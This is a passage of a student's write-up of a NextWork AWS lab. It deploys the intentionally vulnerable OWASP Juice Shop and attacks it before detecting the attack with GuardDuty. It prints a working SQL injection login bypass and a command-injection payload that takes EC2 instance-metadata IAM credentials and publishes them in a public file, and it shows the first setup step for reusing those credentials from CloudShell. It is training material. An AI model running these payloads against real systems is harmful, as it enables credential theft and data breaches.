<img src="https://cdn.prod.website-files.com/677c400686e724409a5a7409/6790ad949cf622dc8dcd9fe4_nextwork-logo-leather.svg" alt="NextWork" width="300" />

# Threat Detection with GuardDuty

**Project Link:** [View Project](http://learn.nextwork.org/projects/aws-security-guardduty)

**Author:** Dineshraj Dhanapathy  
**Email:** dineshrajdhanapathy@gmail.com

---




# Threat Detection with GuardDuty

Deploy an insecure web app, and learn to analyze common threats using GuardDuty!

KEY CONCEPTS

-   [Amazon GuardDuty](https://aws.amazon.com/guardduty/)
-   [Amazon CloudFront](https://aws.amazon.com/cloudfront/)
-   [Amazon S3](https://aws.amazon.com/s3/)
-   [AWS CloudFormation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/Welcome.html)
-   [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

## ⚡️ 30 second Summary

Welcome to this project on threat detection and GuardDuty! 🎉

This project lets you step into the shoes of both an **attacker** and a **defender**, to see how real-world cyberattacks work on web apps.

By the time you're done, you'll have practical experience with spotting and exploiting web vulnerabilities, and using GuardDuty to detect and analyze threats.

This project is most ideal for roles like **Security Analyst**, **Penetration Tester**, or **Cloud Security Engineer**, where it's important to understand web vulnerabilities, exploit techniques, and threat detection.

### In this project, get ready to...

-   Deploy a vulnerable web application (don't worry, it's on purpose)!
    
-   Use hacking techniques to steal credential info.
    
-   Steal sensitive data using stolen credentials.
    
-   Detect and analyze attacks using GuardDuty.
    
-   Implement malware protection to safeguard your data.




![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-complete.png)

-----
## 🛍️ Step #1

### Deploy a Web App

  

GuardDuty is a **threat detection** service, so there's no better way to learn than by deploying an app that GuardDuty needs to protect.

In this first step, let's set up a web app. This web app will be insecure (i.e. full of security vulnerabilities) on purpose.

After we deploy it, we'll attack the web app (like a hacker would), and then check if GuardDuty detected our attack.

 We'll use a CloudFormation template to automate the deployment process.

  
  

**In this step, you're going to:**

-   Deploy a web app using a CloudFormation template.
    
-   Get to know the resources that make up your web app.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-1.0.png)

  



  
  

**Deploy the Web App**

-   Log in to the AWS Management Console [as your IAM Admin user.](https://signin.aws.amazon.com/oauth?redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fstate%3DhashArgs%2523%26isauthcode%3Dtrue&client_id=arn%3Aaws%3Aiam%3A%3A015428540659%3Auser%2Fhomepage&response_type=code&iam_user=true&account=)
    
-   Make sure you're in the AWS region closest to you.
    
-   Head to the `CloudFormation` console.

![Screenshot 2025-05-03 154503](https://github.com/user-attachments/assets/6a3163a3-cb7b-470e-8abb-c1336828a2df)
    

> 💡 **What is AWS CloudFormation?**  
> CloudFormation is a service that helps you create and manage your AWS resources.
> 
> It's an **infrastructure as code** service - meaning you start by writing a file that describes all the resources you want to create.
> 
> Then, CloudFormation reads your file to create, update, and delete the resources described. This saves you time from deploying the resources yourself.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_2.png)

  
![Screenshot 2025-05-03 154530](https://github.com/user-attachments/assets/798cca7c-bb61-40db-9753-a85b6dc2b138)
  
  

**Monitor Stack Creation**

-   Select **Create stack** from the top right corner of the console.
    
-   Select **With new resources (standard)**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_86.png)

 ![Screenshot 2025-05-03 154623](https://github.com/user-attachments/assets/5d29ad45-cfbf-4249-a904-2ea0931d69ad) 

-   Select **Select an existing template**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_3.png)

  

-   Select **Upload a template file**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_4.png)

  ![Screenshot 2025-05-03 154641](https://github.com/user-attachments/assets/3811c105-18fc-4c68-addc-ee7713d010af)

-   Upload this CloudFormation template!
    
    -   👉 [CloudFormation template](https://storage.googleapis.com/nextwork_course_resources/courses/aws/AWS%20Project%20People%20projects/Project%3A%20Threat%20Detection%20with%20Amazon%20GuardDuty/nextwork-guardduty-setup.yaml)
        
-   Select **Select file**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_5.png)

  ![Screenshot 2025-05-03 155024](https://github.com/user-attachments/assets/a00f81b0-c674-48de-918d-802224d25589)


-   Select the CloudFormation template you've downloaded.
-   View in infrastructure composer.

![Screenshot 2025-05-03 155123](https://github.com/user-attachments/assets/6e224932-4da0-4eb8-84f3-1b8638ace63e)
    
-   At the bottom of the page, choose **Next**.
    
-   For **Stack name**, you can enter `NextWork-GuardDuty-project-yourname`
    
-   Make sure to replace `yourname` with your name. Your stack name must be unique across your entire Region. Change your stack name again if it's already taken.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_6.png)

  

-   We can skip the **Parameters** section.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_7.png)

  ![Screenshot 2025-05-03 155357](https://github.com/user-attachments/assets/5f3d0aff-0641-43e8-ac78-38234c27ba27)

> **💡 Extra for PROs: What does the Parameters section do?**  
> The **Parameters** section in a CloudFormation template is like a control panel that lets you customize how AWS resources are set up. By entering details such as the type of computer server (EC2 instance) or the name for storage space (S3 bucket), you can adapt the same setup instructions for different projects or environments.
> 
> This flexibility is important for managing your setup efficiently, avoiding mistakes, and maintaining consistency across deployments, all without needing to change the original instructions laid out by the template creator.

-   Select **Next** at the bottom of the page.
    
-   We can skip the **Tags** and **Permissions** sections.
    

> **💡 Extra for PROs: What do the Tags and Permissions sections do?**  
> **Tags** are like sticky notes you put on your AWS resources. They help you keep things organized, track costs, and manage everything more easily by grouping related resources. For example, you might use the same tag for everything involved in one project or department.
> 
> The **Permissions** section controls who can change your CloudFormation stack. Here, you decide which IAM roles or users can make or change resources. This makes sure only the right people can make updates, keeping your setup safe from any unwanted changes.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_8.png)

  

-   In the **Stack failure options** section, select **Roll back all stack resources** for the first setting i.e. **Behaviour on provisioning failure.**
    

> **💡 What does this setting do?**  
> **Roll back all stack resources** means if something goes wrong during the creation of your resources, CloudFormation can revert things back to how they were before you started the deployment.
> 
> It's like having a safety net to make sure that unsuccessful deployments don't leave unwanted or partially configured resources in your AWS account (which might rack up charges)!

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_9.png)

  ![Screenshot 2025-05-03 155534](https://github.com/user-attachments/assets/559f4d5e-a674-403f-a0ec-317b545faea0)

-   Select **Delete all newly created resources** for the second setting on **Delete newly created resources during a rollback**.
    

> **💡 What does this setting do?**  
> Since we told CloudFormation to roll back all resources in the previous setting, CloudFormation nows wants to know _how_ it should roll things back.
> 
> We chose to **Delete all newly created resources** during a rollback, which **deletes** all resources that were created during the attempted deployment.
> 
> The other option was to **use deletion policy**, which means during a rollback, some resources might be retained, deleted, or handled differently based on CloudFormation's default for each. This could leave some resources in your account, which might rack up charges.

-   Scroll to the bottom of the page. Check the box in the blue pop up banner that says **I acknowledge that AWS CloudFormation might create IAM resources.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_11.png)

  ![Screenshot 2025-05-03 155546](https://github.com/user-attachments/assets/fb2b66ef-ff2d-465d-a48d-88bcfd64628e)


> **💡 What is this checkbox about?**  
> This template you're about to deploy contains some Identity and Access Management (IAM) resources.
> 
> When you deploy a CloudFormation template (like this one), it creates resources like servers and databases. These resources need to communicate with each other. To do this, you need to give them permission. This is done through IAM (Identity and Access Management).
> 
> The checkbox lets you know that the template will create IAM resources that let the deployed resources to communicate. For this template, it's safe to check the box because these permissions are only for the resources to talk to each other. You won't be giving away any sensitive information.

-   Select **Next** at the bottom of the page again.
    
-   Now you're on the final **Review** page. Let's make sure all our settings are correct in the checklist below:
    
![Screenshot 2025-05-03 155710](https://github.com/user-attachments/assets/2cb33525-7f6a-4cdf-b1bf-aa606fa5048b)

  
  

The **Prerequisite - Prepare template** heading says "Template is ready"

![Screenshot 2025-05-03 155720](https://github.com/user-attachments/assets/14398a5a-9a26-4800-9bbc-3b6e3839edc6)

There is a **Template URL**.

![Screenshot 2025-05-03 155730](https://github.com/user-attachments/assets/b994aecb-f7aa-4a5c-8e27-67d84c793993)

The **Stack description** says the following:



```html
This template creates an insecure web app for NextWork's project on threat detection and GuardDuty!

```

Your **Stack name** is "GuardDuty-project-[yourname]"

![Screenshot 2025-05-03 155738](https://github.com/user-attachments/assets/9d735c5c-10fd-4417-8b41-f02b56caa190)

There are 5 items in the **Parameters** section.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_12.png)

![Screenshot 2025-05-03 155745](https://github.com/user-attachments/assets/9f789405-358e-4c3e-83cc-644c4350ff28)  

Under **Stack failure options**, both settings are **Activated.**

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_13.png)

  ![Screenshot 2025-05-03 155806](https://github.com/user-attachments/assets/1c644506-839a-4cd1-bf9b-a5f7ed9ce011)

![Screenshot 2025-05-03 155826](https://github.com/user-attachments/assets/3c4680c5-5249-4d9a-9e6c-ef6c692c7e18)

-   Select **Submit** at the bottom of the page.
    
-   Woohooo! Off it goes.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_14.png)

  ![Screenshot 2025-05-03 155906](https://github.com/user-attachments/assets/47a92b7f-062c-4875-a040-2a2ee8ced612)



-   Wait as CloudFormation goes through your template and tries to deploy your resources.
    
![Screenshot 2025-05-03 160442](https://github.com/user-attachments/assets/ed9c689d-a947-4022-8b86-39db95b7244a)
  
  

The deployment takes up to **10** minutes, so while we wait, let's explore what we're deploying!

![Screenshot 2025-05-03 160750](https://github.com/user-attachments/assets/ff0eb6c3-1b03-486f-88d0-c37326591b89)
  
  ![Screenshot 2025-05-03 160928](https://github.com/user-attachments/assets/b87cfa97-e5f6-43cb-95ee-075a50c121c7)
  

**Breaking Down Your CloudFormation Template**

The CloudFormation template you're deploying creates **27** resources that makes up a web app!

![Screenshot 2025-05-03 161329](https://github.com/user-attachments/assets/737b69fb-a0af-49a7-9bfb-7511030d0d06)

This web app is a copy of a very popular web app for security training, called the **OWASP Juice Shop.** 



Once we're done deploying it, it's going to look like this:

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_80.png)

  ![Screenshot 2025-05-03 161459](https://github.com/user-attachments/assets/aa1054d2-4532-45f2-94fb-202f383124de)

> **💡 What is the OWASP Juice Shop? Why are we using it?**  
> The OWASP Juice Shop is a web application designed for security training. You can check out [the official Juice Shop here.](https://juice-shop.herokuapp.com/) What we've deployed is our own copy of it.
> 
> The OWASP Juice Shop was built with many security flaws on purpose. This lets security engineers practice finding and fixing security problems in a safe environment!
> 
> Tip: OWASP stands for the [**Open Worldwide Application Security Project**.](https://owasp.org/about/) OWASP is a nonprofit online community dedicated to improving software security! They create free resources, and anyone can contribute to an OWASP project (like creating the Juice Shop).

Let's learn how they work together to make up a web app.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_88.png)

  

These 27 resources can be grouped into three main categories:

**🌐 Web app infrastructure**

1.  Your web app is being hosted by a web server i.e. an **EC2 instance!** This means the EC2 instance is responsible for being the engine for running the web app's files, processing requests from incoming traffic, and sending responses. The template also stores the web app files in the EC2 instance itself.  
      
    
2.  There are also **networking** resources that are responsible for hosting this web app _somewhere_ in the AWS environment. Usually, when you launch a new EC2 instance, the instance goes straight into a default VPC in your account. But, this template creates a **new VPC** and networking resources that this EC2 instance will live in. This follows best practice principles - by creating entirely networking resources, people deploying this template can keep the settings in their default VPC.  
      
    
3.  A **CloudFront distribution** is also deployed to speed up the delivery of your web app. Once web app is finished deploying, you'll notice that you can access your own web app from a public URL that anyone can visit. That is all thanks to **CloudFront** distributing your website!
    

> **💡 Extra for PROs: What are the specific networking resources we've deployed?**  
> The networking resources in this template include a new:
> 
> -   VPC
>     
> -   Subnets
>     
> -   Security group
>     
> -   Internet gateway
>     
> -   Route tables
>     
> -   VPC endpoints
>     
> -   Elastic load balancer
>     
> -   Auto scaling group
>     
> -   Launch templates
>     
> -   Prefix lists
>     

  
  

**🪣 S3 Bucket for storage**

This CloudFormation template also launches an **S3 bucket**.

This bucket stores a text file named **important-information.txt**, which is meant to simulate sensitive data. Your web server (EC2 instance) has access to the objects in this bucket.

Later in this project, we're going to act as the hacker that gets access to this file and read its contents i.e. perform a data breach 😈

  
  

**🛡️ GuardDuty for security monitoring**

As you might imagine, there are quite a few moving parts in this web app! This means there are lots of opportunity for security vulnerabilities to exist, which means there are lots of ways hackers can get access into your infrastructure.

Because of this, GuardDuty is also in this template and is automatically **enabled** for monitoring and threat detection.

Later on, after we hack into this web app, we'll jump back into GuardDuty to see whether it's picked up on the incoming threats.

> **💡 What is GuardDuty? How is it an AI service?**  
> AWS GuardDuty is a threat detection service, which means it helps you find potential security risks or attacks in your apps and AWS environment.
> 
> It uses machine learning to look for unusual activity in your AWS account, like your network traffic and CloudTrail activity logs. If it finds something suspicious, it will alert you so you can investigate.



  
  

Don't forget, this project is about threat detection with Amazon GuardDuty.

We've deployed the web app with a CloudFormation template (instead of setting it up manually) so we have can start to hack it straight away. This lets you spend more time in GuardDuty and analyze whether it's picked up on your attacks.



  
  

**Validate Your Stack's Deployment**

-   Head back into the `CloudFormation` console and refresh your page.
    
-   Hooray! Your stack's status should say **CREATE_COMPLETE** now.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_18.png)

  
  ![Screenshot 2025-05-03 161051](https://github.com/user-attachments/assets/1bd06d8a-bdf7-4ebc-bf44-42c0c6d84e1c)

> **🙋‍♀️ My stack's status is still IN_PROGRESS**  
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/cf-in-progress.png)
> 
> It can take longer for the CloudFormation template to finish deploying your resources.
> 
> Give CloudFormation at least 20 minutes to deploy your resources. You can scroll all the way down to the bottom of your Stack's **Events** page to confirm what time it started.
> 
>   
> **🙋‍♀️ My stack's status is giving me ROLLBACK_COMPLETE**  
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/cf-rollback-complete.png)
> 
> Oh no! ROLLBACK_COMPLETE means there was an error somewhere in the deployment process, so CloudFormation has automatically deleted any resources that were done or in progress.
> 
> No stress, the best way to diagnose an error is right there in the CloudFormation console.
> 
> 1.  Select your stack.
>     
> 2.  The **Events** tab should be auto-selected. It will show you an error message.
>     
> 3.  We recommend expanding the error message to see the full details.
>     
> 4.  Stuck on how to resolve your error? You can try re-doing these steps in a **new AWS Region** to start fresh - this has worked especially well for networking (e.g. VPC, security group) related issues.
>     

     


----
## 🔑 Step #2

### Log Into Your Web App

  

Now that we've deployed our web app, let's try opening it.

Then, we'll enter 😈 hacker mode 😈 and see whether we can hack our way into the web app's admin portal.

  
  

**In this step, you're going to:**

-   Open your running web app.
    
-   Use a hacking technique to bypass logging into the admin portal.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-2.0.png)

  



**Locate JuiceShopURL**

-   In your CloudFormation console, stay in your stack's window.
    
-   Select the **Outputs** tab of your deployed stack.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_22.png)

  

> 💡 **What does the outputs tab show?**  
> Outputs are a way to store important information about your resources in AWS CloudFormation. The person that writes the CloudFormation template would define an `Outputs` section, so anyone that deploys the template (like you) will see a neat list of important information that they should know.
> 
> Think of outputs like labels you can add to your resources. For example, you can use them to store things like the name of an S3 bucket or the URL of a website. This makes it easier to find and manage your resources.
> 
> You can also use outputs to share information between different stacks. This is helpful if you need to use the same resources in multiple stacks.

-   Find the `JuiceShopURL` output.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_23.png)

  ![Screenshot 2025-05-03 161329](https://github.com/user-attachments/assets/737b69fb-a0af-49a7-9bfb-7511030d0d06)

> 💡 **What is the JuiceShop URL?**  
> This URL points to the web app you've deployed, which is the OWASP Juice Shop.
> 
> The URL you see won't be the exact same URL as what you see in the screenshot. This is because the URL was dynamically grabbed from the CloudFront distribution you deployed. CloudFront creates a new URL for every new deployment, so you know your URL is unique.

  
  

**Verify Your Web App**

-   Right click on your **JuiceShopURL** to open it in a new tab.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_23.png)

  

-   Select **Dismiss** to close the pop up.
    
![Screenshot 2025-05-03 161445](https://github.com/user-attachments/assets/a19d6c65-9555-4d74-8582-db08fa85f93e)

-   You should see the web app's landing page.

![Screenshot 2025-05-03 161459](https://github.com/user-attachments/assets/aa1054d2-4532-45f2-94fb-202f383124de)
    

> 💡 **Woah! What am I seeing here?**  
> Welcome to the OWASP Juice Shop! This is the web app you've deployed with your CloudFormation template. The web app itself is a juice shop store, where there is a storefront that customers can shop, but also an admin page that requires a login.
> 
> As a reminder - the [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) is a web app designed to help people learn about security risks. It's like a practice website where you can try to find security flaws without causing any real harm. This way, you can learn how to protect real websites from hackers.



> It's time to put on your hacker hat! You've now entered 😈 hacker mode 😈
> 
> Pretend that, as a hacker, you've visited the OWASP Juice Shop web app and decided to try steal confidential data.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-3.0.png)

  

**Log in to Your Web App**

-   At the top right corner, select the **Account** icon and then select **Login.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_25.png)

![Screenshot 2025-05-03 161538](https://github.com/user-attachments/assets/ccec9e13-849f-46b0-a010-e28223bf019a)  

-   On the login page, enter the following ~mysterious~ string in the email field: `' or 1=1;--`
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_26.png)

  
![Screenshot 2025-05-03 161612](https://github.com/user-attachments/assets/cf39e363-f338-47dc-9ee0-a883989f7fd3)


> **💡 What am I doing?**  
> While entering these values might look simple, you are actually doing a security attack called an **SQL injection!**
> 
> SQL injection is a web vulnerability that happens when an attacker can insert malicious SQL code into an application's database queries. This can let them bypass authentication, steal data, or even change the database structure.
> 
>   
> **💡 How is this an SQL injection? What are we doing as an attack?**  
> What you've entered manipulates the SQL query used for login. The `' or 1=1;--` part makes the query always evaluate to true, which lets you avoid the authentication check.



-   Enter anything in the password field. This won't matter - since the SQL injection is set up to accept any password.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_27.png)

  
![Screenshot 2025-05-03 161832](https://github.com/user-attachments/assets/49d845b1-2d42-4438-9ec9-877f69103442)

-   Select **Log in**.
    
-   Great, you've just logged in! There's a green banner that says **You successfully solved a challenge: Login Admin (Log in with the administrator's user account.)**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_28.png)

  ![Screenshot 2025-05-03 161842](https://github.com/user-attachments/assets/1a8d15a6-b543-4f4b-9fda-0fa62e55915c)

> **💡 Extra for PROs: Hmmm, what challenge did I just solve?**  
> We're using the OWASP Juice Shop for threat detection and GuardDuty, but the web app is actually designed to give you 100+ hacking challenges to find and clear!
> 
> We've just cleared one by logging into the admin page, but there are many more sprinkled around the app. If you're interested, you can learn more by clicking into the **Challenges** section of the [OWASP Juice Shop website.](https://owasp.org/www-project-juice-shop/).

-----
## 👾 Step #3

### Exploit the Web App

  

Having bypassed the login page, we'll stay in 😈 hacker mode 😈 and do our next move - stealing credentials to the web app host's AWS environment!

Yup, you guessed it. **You're** the web app host, since you're the one that deployed this web app.

  
  

**In this step, you're going to:**

-   Steal AWS credentials.
    
-   Access the stolen credentials.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-4.0.png)

  



  
  

**Run Malicious Code**

-   Select the **Account** option on the top right hand corner.
    

> 🙋‍♀️ **I don't see the Account option!**  
> If you can't find it, make sure you haven't zoomed into your page. You can also try widening your browser window.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_31.png)

  ![Screenshot 2025-05-03 162007](https://github.com/user-attachments/assets/2247bbb5-8061-4073-a432-38cad43726c9)


-   Select your **admin@juice-sh.op** email.
    

  
  

This takes you to the admin's profile page!

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_32.png)

 ![Screenshot 2025-05-03 162024](https://github.com/user-attachments/assets/6639ee17-e108-451d-82d0-904366c24dfd) 

-   Click into the **Username** field, and paste the following JavaScript code:
    

javascript



```javascript
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}

```

> **💡 Why are we entering code in the Username field?**  
> Imagine if you asked someone their name, but instead of giving you a simple name, they handed you a paper with a command to unlock your phone and hand it to them. That's essentially what you're doing on the admin portal.
> 
> This sneaky trick is called **command injection.** It's a serious security vulnerability where the web server mistakenly executes your commands when it should merely be storing it.
> 
> Your web app expected a straightforward username, but got a script designed to steal keys instead—specifically, keys to the EC2 instance's IAM credentials.
> 
> This type of vulnerability can let attackers access sensitive information, manipulate services, or even take over the server.
> 
>   
> **💡 Extra for PROs: Why does this vulnerability exist?**  
> The root of the issue here is that your web app doesn't clean up or check the data it receives before processing it.
> 
> **Sanitization** is a best practice where the app knows to strip out or block any harmful scripts or commands, so only harmless, intended data is processed. In this case, our web app did not sanitize. That's why you (as the hacker) can run that malicious code!

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_33.png)

 ![Screenshot 2025-05-03 162151](https://github.com/user-attachments/assets/59549109-5fe9-4175-99f8-148dfc5e2e4f)
 

> **💡 Extra for PROs: What does this code do?**  
> The code is a JavaScript command that gives the web app server (i.e. the EC2 instance running your web app's code) a series of instructions.
> 
> All together, these instructions fetch highly sensitive information (IAM credentials to your AWS environment) and stores them in a place where anyone on the internet can access it!
> 
> Let's break down each part of the command:
> 
> 1.  `CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/` sets up an address that points to a special service on AWS called the **EC2 instance metadata service.** This service holds information about your server, like its security credentials for accessing other AWS services. It's only accessible from within the EC2 instance itself, so by passing this in the command injection, you're tricking the web server to access its own metadata.  
>       
>     
> 2.  `TOKEN=\curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` asks the metadata service service for a **session token,** which works like a visitor badge for the metadata service. You need this session token to read the metadata information insde.
>     
> 3.  `CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN")` is an advanced command that retrieves the EC2 instance's IAM credentials (using the session token) and formats them.
>     
> 4.  `echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json` saves the stolen IAM credentials in a **public** JSON file within the web app. This makes the security breach even worse - as the hacker, you've just made the stolen credentials accessible to anyone that visits the web app.
>     



-   Select **Set Username.**
    
-   Check if the profile's username has changed to `[object Object]`
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_35.png)

  ![Screenshot 2025-05-03 162324](https://github.com/user-attachments/assets/5be68a90-37b0-4d6d-ba38-c87d2c19abda)


> **🙋‍♀️ My username says something completely different**  
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/script-error.png)
> 
> Make sure you've run the script in the **Username** field correctly with no typos!
> 

> 
>   
> **💡 Why is the username showing [object Object]?**  
> **Recap:** Command injection is a type of security vulnerability where an attacker can inject commands into a server. In this example, you (as the attacker) inputted code into the username field. The server failed to properly validate this input and treated it as legitimate code to run.
> 
> The username is designed to just display some text, but it'll default to `[object Object]` instead if it's displaying an entire JavaScript object.
> 
> So by seeing `[object Object]`, you know that a new JavaScript object has been created... the JavaScript object is is the **credentials.json** file that your malicious script told the server to create!



  
  

**Access Stolen Credentials**

-   Let's head to the following URL to view the stolen credentials:
    


```
[JuiceShopURL]/assets/public/credentials.json
```

-   Make sure to replace `JuiceShopURL` with your hosted web app's URL.
    

> **💡 Where can I find JuiceShopURL?**  
> Head back into the **CloudFormation** console, and find **JuiceShopURL** in the Outputs section again!
> 
>   
> **💡 How did this become a URL we can access?**  
> The code you ran placed the stolen credentials into a file that’s easy to access through a URL within the Juice Shop app. These credentials, which are temporary AWS access keys, allow access to different AWS services.

Woah! Welcome to the page that your injected code created.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_36.png)

  ![Screenshot 2025-05-03 162605](https://github.com/user-attachments/assets/01271fae-f41d-4f89-8458-92e81f7b3cfd)

On this page, you're seeing the private key credentials that the web app developer is using to store its details.

> 💡 **What are these credentials, why are they a big deal?**  
> These credentials you're looking at are the web app's keys to accessing AWS resources in the developer's account (i.e. your account).
> 
> They are a big deal because they let whoever possesses them to interact with AWS services just like the web app can. This means they could potentially access sensitive data, modify resources, or even incur costs, all under the guise of the legitimate application.
> 
> If these credentials were to fall into the wrong hands (such as the hacker), it could lead to unauthorized access and security vulnerabilities for developers, apps and companies.
> 
>   
> 💡 **Extra for PROs: What is each line saying?**  
> The JSON credential file contains information about your AWS access credentials:
> 
> -   The `AccessKeyId` and `SecretAccessKey` are your main keys for accessing AWS services.
>     
> -   The `Token` adds extra security to your session and is used with your access keys.
>     
> -   The `Expiration` tells you when your credentials will stop working.
>     
> -   The `Code` and `Type` show the status and type of your credentials.
>     

This information helps you understand how much access you have and for how long, which is important for managing security and access control.


----
## 🙈 Step #4

### Steal Data with Stolen Credentials

  

Now that we have the stolen credentials, we'll stay in 😈 hacker mode 😈 to do one last move... stealing **sensitive data** stored in the web app developer's AWS environment!

To do this, we'll use **AWS CloudShell** as the hacker, and run commands that lets us access the host's S3 bucket. These commands would use permissions granted by the stolen credentials, so we'll get access to secret stored inside the S3 bucket in no time.

> 🙋‍♀️ **Am I really hacking into someone's AWS environment?**  
> As a reminder, **you** are the host that deployed this web app. The S3 bucket we're hacking into are all a part of the CloudFormation template we deployed in Step 1. You won't actually be hacking into someone else's AWS environment, or accessing actually confidential information.
> 
> Rest assured, everything you're doing in this project is in a safe environment.

  
  

**In this step, you're going to:**

-   Open AWS CloudShell.


    
-   Configure AWS CLI with the stolen credentials.
    
-   Copy the secret file from the S3 bucket.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-5.0.png)

  



  
  

**Open AWS CloudShell**

-   Head back into the AWS Management Console.
    
-   Open the **CloudShell** console, which sits at the top of your AWS Management Console.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_83.png)

  

-   If this is your first time opening CloudShell, it might take a minute or two for AWS to set you up. Hang on tight!
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_85.png)

  

> 💡 **What is CloudShell?**  
> AWS CloudShell is a space for you to run code in the Management Console. You can use it to manage your AWS resources using code, which is often much more efficient than clicking around in the console.
> 
>   
> 💡 **Why are we using CloudShell?**  
> In this step, we're trying to get access to private data using stolen credentials. To do this, you have to keep the hacker hat on and try to hack into your own AWS environment. We'll use CloudShell to run commands that a hacker would run to steal data inside your AWS environment.

-   Once CloudShell is ready, you'll see a terminal ready for you to enter commands.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_84.png)

![Screenshot 2025-05-03 163309](https://github.com/user-attachments/assets/1dc4180c-ebbd-496a-a95c-85df0c51efc4)  

> 💡 **Extra for PROs: How can I simulate a hacker and 'steal data' while logged into my own AWS account?**  
> Great question! Typically, hackers don't start with access to their victim's AWS environment; they find or force their way in. But since we are both the owner and the 'hacker' in this project, we already have access. So, how can we step into the shoes of an outsider without this access?
> 
> A useful way to create this outsider scenario is actually to use AWS CloudShell. When you use CloudShell, it doesn't just run commands under your main AWS account. Instead, AWS assigns the session a **temporary** AWS account with a **different account ID** than your main one. AWS does this to better monitor and log each command you run via CloudShell, linking them back to the specific session and user.
> 
> Because your CloudShell session is using a **different account ID,** imagine what might happen if you run commands **using the stolen credentials.** Alarm bells will go off for GuardDuty - another AWS account is using credentials that belong to your EC2 instance! That's definitely suspicious activity.
> 
>   
> 💡 **Extra for PROs: But I run commands using CloudShell all the time, why weren't those threats?**  
> Normally, CloudShell inherits your IAM user’s permissions, and the commands you run are considered safe.
> 
> However, we're about to use CloudShell with the stolen credentials (instead of your IAM user's credentials). Then, we're using the credentials to accessing specific resources, which strays from an EC2 instance's usual activity. This flags as suspicious to AWS GuardDuty.
> 
> In short, it’s not the use of CloudShell that triggers GuardDuty, but the credentials you're using and the things you're doing with those credentials.



**Set Environment Variables**

-   In the CloudShell terminal, run the following command.
    
-   Make sure to replace `[JuiceShopURL]` with the `JUICESHOPURL` URL from your CloudFormation stack:
    

> 💡 Tip: It might help to **manually highlight** the code below and paste it in your CloudShell terminal.
> 
> If you select **Copy code** in the code block, the code will automatically run when you paste it into the terminal. This doesn't give you enough time to replace `[JuiceShopURL]` with the URL from your CloudFormation stack!



```
export JUICESHOPURL="[JuiceShopURL]"
```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_37.png)

  

> **🙋‍♀️ Help, my terminal is stuck!**  
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/cloudshell-stuck.png)
> 
>   
> All good! Whenever you're 'stuck' in the terminal (i.e. nothing happens after you type a command), you can always press **Command/Ctrl + C** on your keyboard. This cancels the current command, and starts a new line for you to enter a command again.
> 
> Tip: Your terminal is 'stuck' when it's still waiting for the closing quotation mark to finish the `export JUICESHOPURL="` command you started.
> 
>   
> **💡 What does this code do?**  
> This code sets an **environment variable** in CloudShell, telling it to remember the URL that points to our web app.
> 
> Later on, when we reference `JUICESHOPURL` in a command, CloudShell will know which URL we're referring to and uses that automatically.
> 
>   
